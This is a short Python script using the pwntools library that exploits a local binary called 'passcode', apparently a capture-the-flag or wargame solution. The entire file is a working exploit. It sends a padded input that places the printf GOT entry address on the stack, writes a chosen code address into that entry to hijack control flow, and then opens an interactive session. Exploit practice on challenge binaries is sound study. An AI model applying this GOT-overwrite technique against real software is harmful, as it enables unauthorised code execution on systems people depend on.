from pwn import *

context.binary = elf = ELF('./passcode')
context.terminal = ('kgx', '-e')

if args.GDB:
    r = gdb.debug('./passcode', gdbscript='''
                  b login
                  c
                  ''')
else:
    r = process('./passcode')

payload = b'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyy'
payload = payload.replace(b'yyyy', p32(elf.got['printf']))
r.sendline(payload)

r.sendline(str(int(0x080492A1)).encode())

r.interactive()